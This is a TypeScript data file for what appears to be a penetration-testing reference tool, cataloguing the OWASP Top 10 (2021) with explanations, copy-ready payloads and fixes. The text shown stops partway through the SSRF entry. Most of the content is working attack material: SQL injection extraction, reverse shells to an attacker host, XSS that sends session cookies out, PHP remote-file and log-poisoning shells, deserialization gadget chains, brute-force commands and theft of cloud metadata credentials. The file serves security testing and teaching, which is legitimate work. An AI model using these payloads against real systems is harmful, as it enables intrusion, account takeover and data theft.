/**
 * OWASP Top 10 (2021) as a first-class domain: the ten categories that define
 * web application risk, each treated as a working reference, not a definition.
 * For every category: how it works, where to look, copy-ready testing and
 * exploitation (payloads atomized so each line copies on its own), and the fix.
 *
 * Commands and payloads are byte-exact. Curated placeholders (<TARGET>,
 * <YOUR-IP>, <LPORT>, <USER>, <PASS>) fill from the Variable Console; raw tags
 * like <script> are never touched, so XSS payloads copy exactly as written.
 *
 * Structured data: adding a category, block, or payload is a data entry.
 */
import type { Cmd } from './commands.ts';

export interface OwaspBlock {
  title: string;      // block heading (e.g. "Detection payloads")
  blurb?: string;     // one line of intent above the rows
  rows: Cmd[];        // copyable, variable-filled
}

export interface OwaspEntry {
  rank: string;       // A01 ... A10
  id: string;         // slug + anchor
  title: string;
  tag: string;        // the sub-vulnerabilities in one line
  risk: 'critical' | 'high' | 'medium';
  what: string;       // how it works
  find: string;       // where and how to find it
  blocks: OwaspBlock[];
  defense: string;    // how it is fixed (know it, to exploit and to report)
  refs: { label: string; url: string }[];
}

export const OWASP: OwaspEntry[] = [
  // ---------------------------------------------------------------- A01
  {
    rank: 'A01', id: 'broken-access-control', title: 'Broken Access Control',
    tag: 'IDOR · forced browsing · privilege escalation · path traversal',
    risk: 'critical',
    what: 'The application fails to enforce who is allowed to do what. A user can reach data or actions beyond their role by changing an identifier, a parameter, or a URL. IDOR (Insecure Direct Object Reference) is the most common form: an object id in the request points straight at a record with no ownership check. It moved to number one in 2021 because it is everywhere and it is found by hand, not by a scanner.',
    find: 'Log in as a low-privilege user, proxy everything through Burp, and look for any identifier you control: numeric ids, UUIDs, usernames, filenames, and role or user_id fields in bodies. Then change them. Two accounts side by side is the cleanest test: capture user A resources, replay them as user B.',
    blocks: [
      {
        title: 'Horizontal access (another user\'s data, same role)',
        blurb: 'Change the object reference to one you do not own. A 200 with someone else\'s data confirms it.',
        rows: [
          { cmd: 'GET /api/user/1337   ->   GET /api/user/1', desc: 'Numeric id in the path: walk it toward low ids (admin is often 1)' },
          { cmd: 'GET /api/orders/9812   ->   GET /api/orders/1', desc: 'Order / invoice history is a classic IDOR sink' },
          { cmd: 'GET /download?file=user_1337_invoice.pdf   ->   file=user_1_invoice.pdf', desc: 'Predictable filenames in a download param' },
          { cmd: 'POST /api/update-profile  {"user_id": 5, ...}   ->   {"user_id": 1, ...}', desc: 'Ownership id in the request body' },
          { cmd: 'DELETE /api/post/456', desc: 'Try acting on an object you do not own (write-side IDOR)' },
        ],
      },
      {
        title: 'Vertical access (do what a higher role can)',
        blurb: 'Reach admin functionality as a normal user, or tamper a role field the server trusts.',
        rows: [
          { cmd: 'POST /api/update-profile  {"user_id": 5, "role": "admin"}', desc: 'Mass-assignment: set the role the app forgot to protect' },
          { cmd: 'POST /api/admin/delete-user  {"target_id": 1}', desc: 'Call the admin endpoint directly (missing server-side auth check)' },
          { cmd: 'GET /admin/', desc: 'Forced browsing: hit privileged paths the UI never links you to' },
          { cmd: 'Cookie: isAdmin=false   ->   isAdmin=true', desc: 'Client-trusted authorization flag in a cookie or hidden field' },
        ],
      },
      {
        title: 'Path traversal (read files outside the web root)',
        blurb: 'When a parameter names a file on disk, walk out of the intended directory.',
        rows: [
          { cmd: '../../../etc/passwd', desc: 'Basic traversal: prove the read, then pivot to config and keys' },
          { cmd: '..%2f..%2f..%2fetc%2fpasswd', desc: 'URL-encode the slashes when raw ../ is filtered' },
          { cmd: '....//....//....//etc/passwd', desc: 'Nested traversal: survives a non-recursive strip of ../' },
          { cmd: '/download?file=../../../../etc/shadow', desc: 'Absolute or deep-relative when the app prepends a base path' },
        ],
      },
      {
        title: 'Enumerate ids at scale (Burp Intruder)',
        blurb: 'Automate the id sweep, then sort by response length or status to spot the hits.',
        rows: [
          { cmd: 'ffuf -u "http://<TARGET>/api/user/FUZZ" -w <(seq 1 2000) -mc 200 -fs 0', desc: 'Sweep ids from the shell: match 200, filter the empty-body size' },
          { cmd: 'ffuf -u "http://<TARGET>/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403', desc: 'Forced-browsing sweep for hidden privileged paths' },
        ],
      },
    ],
    defense: 'Enforce authorization server-side on every request, deny by default, and key every object lookup to the authenticated session (never to a client-supplied id or role). Use unpredictable references and reject traversal sequences.',
    refs: [
      { label: 'OWASP A01:2021', url: 'https://owasp.org/Top10/A01_2021-Broken_Access_Control/' },
      { label: 'PortSwigger: access control', url: 'https://portswigger.net/web-security/access-control' },
      { label: 'PortSwigger: IDOR', url: 'https://portswigger.net/web-security/access-control/idor' },
    ],
  },

  // ---------------------------------------------------------------- A02
  {
    rank: 'A02', id: 'cryptographic-failures', title: 'Cryptographic Failures',
    tag: 'plaintext data · weak hashing · hardcoded keys · weak TLS',
    risk: 'high',
    what: 'Sensitive data is exposed because crypto is missing, weak, or misused: secrets sent or stored in the clear, passwords hashed with fast or unsalted algorithms (MD5, SHA1), hardcoded keys in source, or transport that allows downgrade. The impact is disclosure of credentials, tokens, PII, and card data. Formerly named Sensitive Data Exposure.',
    find: 'Watch what crosses the wire and what sits in responses, source, and storage. Look for tokens in URLs, secrets in JS bundles and git history, cookies missing Secure, and any hash you can identify. Then crack, decode, or replay.',
    blocks: [
      {
        title: 'Find secrets in what the app already gives you',
        blurb: 'Client-side source, comments, and history leak keys constantly.',
        rows: [
          { cmd: 'curl -s http://<TARGET>/main.js | grep -iE "api[_-]?key|secret|token|password|aws_"', desc: 'Grep the JS bundle for embedded secrets' },
          { cmd: 'gitleaks detect --source . -v', desc: 'Scan a cloned repo for committed keys and tokens' },
          { cmd: 'trufflehog git file://. --only-verified', desc: 'Hunt live, verified secrets across git history' },
          { cmd: 'curl -s http://<TARGET>/.git/config && wget -r http://<TARGET>/.git/', desc: 'Exposed .git: pull it, then git log for secrets and old code' },
        ],
      },
      {
        title: 'Identify and crack weak hashes',
        blurb: 'Recover the hash, name the algorithm, then attack it offline.',
        rows: [
          { cmd: 'hashid \'<HASH>\'   #  or:  hash-identifier', desc: 'Identify the algorithm from the hash format' },
          { cmd: 'hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt', desc: 'Crack raw MD5 (mode 0). SHA1 = -m 100, bcrypt = -m 3200' },
          { cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', desc: 'John autodetects many formats' },
          { cmd: 'echo -n \'YWRtaW46YWRtaW4=\' | base64 -d', desc: 'Decode Base64 (encoding is not encryption): here admin:admin' },
        ],
      },
      {
        title: 'Inspect transport and cookie protection',
        blurb: 'Downgradeable TLS and cookies without Secure leak the session.',
        rows: [
          { cmd: 'sslscan <TARGET>:443', desc: 'Enumerate protocols and ciphers: flag SSLv3, TLS 1.0/1.1, weak suites' },
          { cmd: 'testssl.sh https://<TARGET>', desc: 'Full TLS audit: Heartbleed, ROBOT, weak ciphers, cert issues' },
          { cmd: 'curl -sI https://<TARGET> | grep -i "set-cookie"', desc: 'Session cookie missing Secure / HttpOnly is interceptable' },
        ],
      },
    ],
    defense: 'Encrypt sensitive data in transit (TLS 1.2+, HSTS) and at rest. Hash passwords with a slow salted KDF (bcrypt, scrypt, Argon2), never MD5/SHA1. Keep keys out of source, rotate them, and never put secrets in URLs.',
    refs: [
      { label: 'OWASP A02:2021', url: 'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/' },
      { label: 'PortSwigger: JWT attacks', url: 'https://portswigger.net/web-security/jwt' },
    ],
  },

  // ---------------------------------------------------------------- A03
  {
    rank: 'A03', id: 'injection', title: 'Injection',
    tag: 'SQLi · command injection · XSS · LFI/RFI · NoSQL',
    risk: 'critical',
    what: 'Untrusted input is interpreted as code or query syntax by an interpreter downstream: SQL, the OS shell, the browser (XSS), a file include, or a NoSQL engine. Because the input crosses from data into instructions, the attacker rewrites what the server or the victim\'s browser does. In 2021 XSS is folded into this category. This is the richest hunting ground in web, so it carries the most depth here.',
    find: 'Reach every input: GET and POST params, JSON fields, cookies, and headers (User-Agent, Referer, X-Forwarded-For). Send one metacharacter at a time and watch for errors, changed responses, timing shifts, or reflected content. Confirm the class first, then exploit.',
    blocks: [
      {
        title: 'SQLi: detection payloads',
        blurb: 'One at a time into any parameter. An error, a changed page, or a delay confirms it.',
        rows: [
          { cmd: "'", desc: 'The classic: a single quote breaks an unquoted string context' },
          { cmd: "' OR 1=1-- -", desc: 'Auth-bypass / always-true tautology' },
          { cmd: '1 AND 1=1     vs     1 AND 1=2', desc: 'Same page then different page = boolean-based injection' },
          { cmd: "1' ORDER BY 1-- -", desc: 'Increase the number until it errors: last success = column count' },
          { cmd: "' AND SLEEP(5)-- -", desc: 'A 5s delay = blind injection (MySQL). No visible output needed' },
        ],
      },
      {
        title: 'SQLi: extraction (union + error + blind)',
        blurb: 'Once the class is known, pull data. Match your column count from ORDER BY.',
        rows: [
          { cmd: "' UNION SELECT NULL,NULL-- -", desc: 'Balance columns with NULLs until the page renders' },
          { cmd: "' UNION SELECT user(),database(),version()-- -", desc: 'Fingerprint: current user, DB name, version in visible columns' },
          { cmd: "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -", desc: 'Enumerate tables in the current database' },
          { cmd: "' UNION SELECT username,password FROM users-- -", desc: 'Dump credentials from the target table' },
          { cmd: "' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -", desc: 'Error-based: leak data inside the error message (MySQL)' },
          { cmd: "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -", desc: 'Read a file (MySQL, needs FILE privilege)' },
        ],
      },
      {
        title: 'SQLi: sqlmap',
        blurb: 'Automate once you have found the parameter. A saved Burp request is the fastest start.',
        rows: [
          { cmd: 'sqlmap -u "http://<TARGET>/page.php?id=1" --batch', desc: 'Point-and-go on a GET parameter' },
          { cmd: 'sqlmap -r request.txt --batch', desc: 'From a saved Burp request (mark the injection point with *)' },
          { cmd: 'sqlmap -u "http://<TARGET>/page.php?id=1" --batch --dbs', desc: 'Enumerate databases, then -D <db> --tables, then --dump' },
          { cmd: 'sqlmap -u "http://<TARGET>/page.php?id=1" --os-shell --batch', desc: 'Escalate SQLi to an OS shell (stacked queries / file write)' },
          { cmd: 'sqlmap -u "http://<TARGET>/page.php?id=1" --level=5 --risk=3 --tamper=between,space2comment --batch', desc: 'Aggressive + WAF bypass via tamper scripts' },
        ],
      },
      {
        title: 'Command injection',
        blurb: 'Append shell metacharacters to any input that reaches a system command.',
        rows: [
          { cmd: ';id', desc: 'Chain a command with ; (also try | , || , && , `id` , $(id) )' },
          { cmd: ';sleep 5', desc: 'Blind confirmation: a 5s delay proves execution' },
          { cmd: ';curl http://<YOUR-IP>/hit', desc: 'Out-of-band proof: catch the callback on your listener' },
          { cmd: ';bash -i >& /dev/tcp/<YOUR-IP>/<LPORT> 0>&1', desc: 'Reverse shell (URL-encode when in an HTTP parameter)' },
          { cmd: 'cat${IFS}/etc/passwd', desc: 'Space filtered? ${IFS} substitutes the separator' },
          { cmd: "c'a't /etc/passwd", desc: 'Keyword filtered? Break it with quotes: c\'a\'t, ca\\t, who$@ami' },
        ],
      },
      {
        title: 'XSS: confirmation payloads',
        blurb: 'Reflected, stored, or DOM. Raw tags are never touched by the Variable Console, so these copy exactly.',
        rows: [
          { cmd: '<script>alert(1)</script>', desc: 'Baseline: fires when the sink allows a raw script tag' },
          { cmd: '<img src=x onerror=alert(1)>', desc: 'No script tag needed: event handler on a broken image' },
          { cmd: '<svg onload=alert(1)>', desc: 'Compact, survives many naive filters' },
          { cmd: '"><script>alert(1)</script>', desc: 'Break out of an attribute value first, then inject' },
          { cmd: '"><img src=x onerror=alert(document.domain)>', desc: 'Show the executing origin (proves context for the report)' },
          { cmd: '<ScRiPt>alert(1)</ScRiPt>', desc: 'Case-flip to defeat a case-sensitive blocklist' },
        ],
      },
      {
        title: 'XSS: weaponized (steal the session)',
        blurb: 'Point the exfil at your listener (python3 -m http.server 80). Impact turns a pop-up into a finding.',
        rows: [
          { cmd: "<script>fetch('http://<YOUR-IP>/?c='+btoa(document.cookie))</script>", desc: 'Quiet exfil of cookies via fetch, base64-wrapped' },
          { cmd: '<img src=x onerror="this.src=\'http://<YOUR-IP>/?c=\'+document.cookie">', desc: 'Cookie theft when script tags are blocked' },
          { cmd: "<script>new Image().src='http://<YOUR-IP>/?c='+document.cookie</script>", desc: 'Image-beacon exfil, no visible request' },
        ],
      },
      {
        title: 'LFI / RFI and PHP wrappers',
        blurb: 'When a param includes a file, read local files or reach code execution.',
        rows: [
          { cmd: '?page=../../../../etc/passwd', desc: 'Local file read: confirm with /etc/passwd, then hunt configs and keys' },
          { cmd: '?page=php://filter/convert.base64-encode/resource=index.php', desc: 'Read PHP source (Base64) without executing it, then decode' },
          { cmd: '?page=data://text/plain,<?php system($_GET[\'cmd\']); ?>&cmd=id', desc: 'data:// wrapper: inline PHP to RCE (needs allow_url_include)' },
          { cmd: "?page=/var/log/apache2/access.log&cmd=id", desc: 'Log poisoning: inject PHP via User-Agent, then include the log' },
          { cmd: 'curl -s http://<TARGET>/ -H \'User-Agent: <?php system($_GET["cmd"]); ?>\'', desc: 'Step 1 of log poisoning: plant the payload in the access log' },
          { cmd: '?page=http://<YOUR-IP>:8080/rfi_shell.php&cmd=id', desc: 'RFI: include remote PHP from your server for direct RCE' },
        ],
      },
      {
        title: 'NoSQL injection',
        blurb: 'MongoDB and friends: operators in the query bypass authentication and leak data.',
        rows: [
          { cmd: "username[$ne]=1&password[$ne]=1", desc: 'Operator injection in a form body: not-equal bypasses login' },
          { cmd: '{"username": {"$ne": null}, "password": {"$ne": null}}', desc: 'Same idea in a JSON body: match any non-null user' },
          { cmd: '{"username": "admin", "password": {"$regex": "^a"}}', desc: 'Blind extraction: brute the password char by char via $regex' },
        ],
      },
    ],
    defense: 'Never build interpreter strings from input. Use parameterized queries / prepared statements for SQL, avoid the shell (use argument arrays and allowlists), context-encode all output and set a strong CSP for XSS, and disable remote includes and dynamic file paths.',
    refs: [
      { label: 'OWASP A03:2021', url: 'https://owasp.org/Top10/A03_2021-Injection/' },
      { label: 'PortSwigger: SQL injection', url: 'https://portswigger.net/web-security/sql-injection' },
      { label: 'PortSwigger: XSS', url: 'https://portswigger.net/web-security/cross-site-scripting' },
      { label: 'PortSwigger: OS command injection', url: 'https://portswigger.net/web-security/os-command-injection' },
    ],
  },

  // ---------------------------------------------------------------- A04
  {
    rank: 'A04', id: 'insecure-design', title: 'Insecure Design',
    tag: 'logic flaws · missing limits · abusable workflows',
    risk: 'high',
    what: 'The flaw is in the design, not a coding bug: a missing control, a trusting workflow, or an abusable business rule. No amount of clean code fixes a feature that was never meant to be safe. Examples: a password reset with no rate limit, a checkout that trusts a client-side price, a coupon that stacks forever, or a multi-step flow you can complete out of order.',
    find: 'Think like an abuser of the feature, not a scanner. Map every workflow and ask: what does the server assume the client will not do? Then do exactly that. Replay steps, skip steps, send negative or huge numbers, and race the same action in parallel.',
    blocks: [
      {
        title: 'Abuse the business logic',
        blurb: 'Tamper the values and the order the app trusts you to respect.',
        rows: [
          { cmd: 'POST /cart/checkout  {"item": 1, "price": 999.00}   ->   {"price": 0.01}', desc: 'Trusted client-side price: set your own total' },
          { cmd: '{"quantity": -5}', desc: 'Negative quantity can credit the balance instead of charging' },
          { cmd: 'Apply coupon SAVE20 ... then replay the request 20x', desc: 'Missing single-use / stacking check on a discount' },
          { cmd: 'Complete step 3 without steps 1-2 (POST /flow/confirm directly)', desc: 'Skip a step the server assumed was already done' },
        ],
      },
      {
        title: 'Missing rate limits and anti-automation',
        blurb: 'If a sensitive action can be repeated fast, it will be.',
        rows: [
          { cmd: 'ffuf -u "http://<TARGET>/verify?otp=FUZZ" -w <(seq -w 0 9999) -mc 200 -fs 0', desc: 'Brute a 4-digit OTP with no lockout' },
          { cmd: 'for i in $(seq 1 50); do curl -s -X POST http://<TARGET>/reset -d "email=<USER>"; done', desc: 'Hammer password reset: no throttle = enumeration + spam vector' },
        ],
      },
    ],
    defense: 'Threat-model the feature before building it. Enforce limits, quotas, and single-use on sensitive actions; re-validate every value and every step server-side; and never trust price, role, quantity, or state that came from the client.',
    refs: [
      { label: 'OWASP A04:2021', url: 'https://owasp.org/Top10/A04_2021-Insecure_Design/' },
      { label: 'PortSwigger: business logic', url: 'https://portswigger.net/web-security/logic-flaws' },
    ],
  },

  // ---------------------------------------------------------------- A05
  {
    rank: 'A05', id: 'security-misconfiguration', title: 'Security Misconfiguration',
    tag: 'default creds · verbose errors · dir listing · XXE · CORS',
    risk: 'high',
    what: 'The stack is insecure out of the box: default accounts left enabled, admin panels exposed, directory listing on, verbose stack traces, unnecessary services, or permissive CORS. In 2021 XXE (XML External Entity) is folded in here, since it is a parser configuration left dangerously open. These are the fastest wins because you often just have to look.',
    find: 'Fingerprint the stack, then check the known soft spots: default logins, exposed admin and status endpoints, backup and config files, error verbosity, security headers, and any XML parser you can feed an entity to.',
    blocks: [
      {
        title: 'Fingerprint and surface the config',
        blurb: 'Content discovery plus header inspection reveals most misconfigurations.',
        rows: [
          { cmd: 'whatweb http://<TARGET> && curl -sI http://<TARGET>', desc: 'Identify the stack and read response headers' },
          { cmd: 'nikto -h http://<TARGET>', desc: 'Flags default files, dangerous methods, missing headers, known issues' },
          { cmd: 'gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,bak,zip,config,old', desc: 'Find backups, configs, and admin paths left on disk' },
          { cmd: 'curl -s http://<TARGET>/server-status && curl -s http://<TARGET>/.env', desc: 'Exposed status page / .env file leaks internals and secrets' },
        ],
      },
      {
        title: 'Default credentials',
        blurb: 'Try the vendor defaults before anything clever. They work far too often.',
        rows: [
          { cmd: 'admin:admin   admin:password   root:root   tomcat:tomcat', desc: 'The universal shortlist for exposed login panels' },
          { cmd: 'hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt <TARGET> http-get /admin', desc: 'Spray a default-creds list at a protected path' },
        ],
      },
      {
        title: 'XXE (XML External Entity)',
        blurb: 'Any endpoint that parses XML you supply: file read, SSRF, and sometimes RCE.',
        rows: [
          { cmd: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', desc: 'Classic file read via an external entity' },
          { cmd: '<!DOCTYPE r [<!ENTITY x SYSTEM "http://<YOUR-IP>/xxe">]>', desc: 'Blind / OOB XXE: force the parser to call back to you' },
          { cmd: '<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">', desc: 'Read PHP source through the parser via a filter wrapper' },
        ],
      },
      {
        title: 'Permissive CORS',
        blurb: 'A reflected origin with credentials lets a malicious site read authenticated responses.',
        rows: [
          { cmd: 'curl -s -I http://<TARGET>/api/me -H "Origin: https://evil.com"', desc: 'If ACAO reflects evil.com and ACAC is true, cross-origin theft is possible' },
        ],
      },
    ],
    defense: 'Harden and minimize: remove defaults and unused features, disable directory listing and verbose errors, set security headers, lock down CORS to an allowlist, and disable DTD / external entities in every XML parser.',
    refs: [
      { label: 'OWASP A05:2021', url: 'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/' },
      { label: 'PortSwigger: XXE', url: 'https://portswigger.net/web-security/xxe' },
      { label: 'PortSwigger: CORS', url: 'https://portswigger.net/web-security/cors' },
    ],
  },

  // ---------------------------------------------------------------- A06
  {
    rank: 'A06', id: 'vulnerable-components', title: 'Vulnerable and Outdated Components',
    tag: 'known-CVE libraries · unpatched services · dependency risk',
    risk: 'high',
    what: 'The app runs a component with a public, exploitable vulnerability: an old CMS, an unpatched framework, a stale JS library, or a service version with a known CVE. You do not find a new bug, you match a version to an existing exploit. Log4Shell and countless CMS RCEs live here.',
    find: 'Fingerprint every version you can see: server headers, framework banners, JS library versions, CMS generator tags. Then search for a matching public exploit. Precision on the version is the whole game.',
    blocks: [
      {
        title: 'Fingerprint versions',
        blurb: 'Get an exact version string before searching for an exploit.',
        rows: [
          { cmd: 'whatweb -a 3 http://<TARGET>', desc: 'Aggressive fingerprint: server, framework, CMS, and versions' },
          { cmd: 'curl -s http://<TARGET>/ | grep -iE "generator|version|jquery|bootstrap"', desc: 'Read version hints out of the HTML and asset URLs' },
          { cmd: 'nmap -sV --script=banner -p- <TARGET>', desc: 'Service and version detection across all ports' },
        ],
      },
      {
        title: 'CMS scanners',
        blurb: 'Purpose-built enumeration for the common platforms.',
        rows: [
          { cmd: 'wpscan --url http://<TARGET> --enumerate vp,u --api-token <WPSCAN-TOKEN>', desc: 'WordPress: vulnerable plugins/themes and user enumeration' },
          { cmd: 'droopescan scan drupal -u http://<TARGET>', desc: 'Drupal version and module enumeration' },
          { cmd: 'joomscan --url http://<TARGET>', desc: 'Joomla component and version enumeration' },
        ],
      },
      {
        title: 'Match to a public exploit',
        blurb: 'Turn the version into a working exploit path.',
        rows: [
          { cmd: 'searchsploit apache 2.4.49', desc: 'Local Exploit-DB search by product and version' },
          { cmd: 'searchsploit -m 50383', desc: 'Copy an exploit locally to read and run it' },
          { cmd: 'nmap --script vuln -p- <TARGET>', desc: 'Broad vuln-script sweep for known-CVE services' },
        ],
      },
    ],
    defense: 'Maintain a live inventory (SBOM), track advisories for every dependency, and patch on a schedule. Remove unused components and pin versions so an audit is possible.',
    refs: [
      { label: 'OWASP A06:2021', url: 'https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/' },
      { label: 'Exploit-DB', url: 'https://www.exploit-db.com/' },
    ],
  },

  // ---------------------------------------------------------------- A07
  {
    rank: 'A07', id: 'auth-failures', title: 'Identification and Authentication Failures',
    tag: 'brute force · credential stuffing · weak session · JWT flaws',
    risk: 'high',
    what: 'Authentication is weak or breakable: no brute-force protection, weak or default passwords, username enumeration, guessable or fixated sessions, broken password reset, or flawed JWT validation. Once identity is forgeable, every other control downstream is moot.',
    find: 'Probe the login and account-recovery flows: does it reveal whether a user exists? Does it lock out? Is the session token predictable or accepted after logout? Inspect any JWT for a weak or none algorithm.',
    blocks: [
      {
        title: 'Enumerate users, then brute / spray',
        blurb: 'Different responses for valid vs invalid users make brute force efficient.',
        rows: [
          { cmd: 'ffuf -u http://<TARGET>/login -X POST -d "user=FUZZ&pass=x" -w users.txt -fr "Invalid username"', desc: 'Username enumeration: filter the "no such user" response' },
          { cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"', desc: 'Brute force with a failure string as the negative marker' },
          { cmd: 'hydra -l <USER> -P passwords.txt <TARGET> ssh', desc: 'Password brute against a service (ssh, ftp, rdp, ...)' },
          { cmd: 'Spray one password across many users (avoid lockout)', desc: 'Credential stuffing / spraying beats per-account lockouts' },
        ],
      },
      {
        title: 'Session weaknesses',
        blurb: 'A token that is guessable, fixated, or valid after logout is a full bypass.',
        rows: [
          { cmd: 'Log in, note the cookie, log out, replay the old cookie', desc: 'Session not invalidated on logout = reusable session' },
          { cmd: 'Set a known session id before login, see if it persists (fixation)', desc: 'Fixation: the app keeps your pre-auth session after login' },
          { cmd: 'burpsuite -> Sequencer on the session token', desc: 'Measure token entropy: low randomness = predictable sessions' },
        ],
      },
      {
        title: 'JWT attacks',
        blurb: 'Inspect the token, then attack the algorithm or the signing key.',
        rows: [
          { cmd: 'echo <JWT> | cut -d. -f2 | base64 -d', desc: 'Decode the payload: read the claims (role, exp, user)' },
          { cmd: 'python3 jwt_tool.py <JWT> -X a', desc: 'alg:none attack: strip the signature if the server trusts it' },
          { cmd: 'hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt', desc: 'Crack a weak HS256 secret offline, then forge any token' },
        ],
      },
    ],
    defense: 'Enforce MFA, rate-limit and lock out brute force, and ban weak or breached passwords. Issue high-entropy session tokens, rotate on login, invalidate on logout, and validate JWT algorithm and signature strictly server-side.',
    refs: [
      { label: 'OWASP A07:2021', url: 'https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/' },
      { label: 'PortSwigger: authentication', url: 'https://portswigger.net/web-security/authentication' },
    ],
  },

  // ---------------------------------------------------------------- A08
  {
    rank: 'A08', id: 'integrity-failures', title: 'Software and Data Integrity Failures',
    tag: 'insecure deserialization · unsigned updates · CI/CD trust',
    risk: 'high',
    what: 'The app trusts code or data whose integrity it never verified: unsigned updates, plugins from untrusted sources, a compromised build pipeline, or serialized objects accepted from the client. Insecure deserialization is the flagship: a crafted serialized blob triggers code execution when the server rebuilds the object.',
    find: 'Look for serialized data crossing a trust boundary: base64 blobs in cookies and parameters, __VIEWSTATE, Java or PHP or Python serialized formats, and any auto-update or plugin mechanism that does not check a signature.',
    blocks: [
      {
        title: 'Spot serialized data',
        blurb: 'Recognize the format before you attack it.',
        rows: [
          { cmd: 'rO0AB...   ->   Java serialized (base64 of 0xACED0005)', desc: 'A cookie/param starting rO0AB is a Java object' },
          { cmd: 'O:4:"User":2:{...}   ->   PHP serialized object', desc: 'PHP serialize() output, often in a cookie' },
          { cmd: 'echo <BLOB> | base64 -d | xxd | head', desc: 'Decode and inspect the magic bytes to identify the format' },
        ],
      },
      {
        title: 'Exploit deserialization',
        blurb: 'Generate a gadget-chain payload, then deliver it where the blob is parsed.',
        rows: [
          { cmd: 'java -jar ysoserial.jar CommonsCollections5 \'bash -i >& /dev/tcp/<YOUR-IP>/<LPORT> 0>&1\' | base64', desc: 'Java: build an RCE gadget chain (pick the chain that matches libs)' },
          { cmd: 'phpggc Symfony/RCE4 system id -b', desc: 'PHP: generate a gadget-chain payload (base64) with PHPGGC' },
          { cmd: 'python3 -c "import pickle,os,base64;print(base64.b64encode(pickle.dumps(type(\'x\',(),{\'__reduce__\':lambda s:(os.system,(\'id\',))})())).decode())"', desc: 'Python: a pickle that runs id on load (never unpickle untrusted data)' },
        ],
      },
    ],
    defense: 'Never deserialize untrusted data; if you must, use a data-only format (JSON) with strict schemas and no object instantiation. Sign and verify updates and artifacts, pin dependencies by hash, and secure the CI/CD pipeline.',
    refs: [
      { label: 'OWASP A08:2021', url: 'https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/' },
      { label: 'PortSwigger: deserialization', url: 'https://portswigger.net/web-security/deserialization' },
    ],
  },

  // ---------------------------------------------------------------- A09
  {
    rank: 'A09', id: 'logging-monitoring-failures', title: 'Security Logging and Monitoring Failures',
    tag: 'no audit trail · missed alerts · slow detection',
    risk: 'medium',
    what: 'Attacks are not logged, alerts do not fire, and no one is watching, so breaches go undetected for months. This rarely gives direct access, but it shapes the engagement: it is why loud attacks succeed, and it is a real, reportable finding. As an operator, it also tells you how much noise you can make.',
    find: 'Test whether meaningful events are recorded and surfaced: failed logins, access-control denials, input validation failures, and admin actions. Trigger them and ask the defender (or check the logs on an assumed-breach engagement) whether anything registered.',
    blocks: [
      {
        title: 'Probe detection coverage',
        blurb: 'Generate the events a competent SOC should catch, then see if they did.',
        rows: [
          { cmd: 'for i in $(seq 1 20); do curl -s -o /dev/null http://<TARGET>/login -d "user=admin&pass=wrong$i"; done', desc: '20 failed logins: is there any lockout, alert, or log entry?' },
          { cmd: "curl -s \"http://<TARGET>/?q=' OR 1=1-- -\"", desc: 'An obvious attack string: does a WAF or monitor react?' },
          { cmd: 'grep -riE "fail|denied|error" /var/log/ 2>/dev/null | tail', desc: 'Assumed-breach: confirm whether your actions were recorded at all' },
        ],
      },
    ],
    defense: 'Log auth, access-control, and validation failures with enough context to trace them, ship logs to a tamper-resistant store, alert on suspicious patterns in near-real-time, and rehearse incident response so alerts lead to action.',
    refs: [
      { label: 'OWASP A09:2021', url: 'https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/' },
    ],
  },

  // ---------------------------------------------------------------- A10
  {
    rank: 'A10', id: 'ssrf', title: 'Server-Side Request Forgery (SSRF)',
    tag: 'cloud metadata · internal port scan · protocol smuggling',
    risk: 'high',
    what: 'The server can be tricked into making requests to a destination the attacker chooses. Any feature that fetches a URL (webhooks, PDF/image generators, URL previews, imports) is a candidate. Because the request originates from inside, it reaches internal services, and on cloud it reaches the metadata endpoint that hands out credentials.',
    find: 'Find every input that becomes a server-side request: url=, image=, webhook, callback, next. Point it at yourself first to confirm the server fetches it, then pivot to internal addresses, localhost, and the cloud metadata IP.',
    blocks: [
      {
        title: 'Confirm and map internal reach',
        blurb: 'Prove the server fetches your URL, then turn it inward.',
        rows: [
          { cmd: 'url=http://<YOUR-IP>/ssrf-probe', desc: 'First: point it at your listener to confirm a server-side fetch' },
          { cmd: 'url=http://127.0.0.1:80/   (then 8080, 6379, 3306, 8000)', desc: 'Reach loopback services the firewall hides from outside' },
          { cmd: 'ffuf -u "http://<TARGET>/fetch?url=http://127.0.0.1:FUZZ" -w <(seq 1 10000) -fs 0', desc: 'Internal port scan via SSRF: response differences reveal open ports' },
        ],
      },
      {
        title: 'Cloud metadata (credential theft)',
        blurb: 'The 169.254.169.254 endpoint returns temporary cloud credentials to anything inside.',
        rows: [
          { cmd: 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'AWS: list the IAM role, then append the role name for keys' },
          { cmd: 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>', desc: 'AWS: retrieve AccessKeyId, SecretAccessKey, and Token' },
          { cmd: 'url=http://metadata.google.internal/computeMetadata/v1/   (Header: Metadata-Flavor: Google)', desc: 'GCP metadata (needs the Metadata-Flavor header)' },
        ],
      },
      {
        title: 'Bypass SSRF filters',
        blurb: 'When localhost or the metadata IP is blocklisted, encode around it.',
        rows: [
          { cmd: 'http://127.1/   http://0/   http://[::]/   http://2130706433/', desc: 'Alternate encodings of 127.0.0.1 (decimal, IPv6, short forms)' },
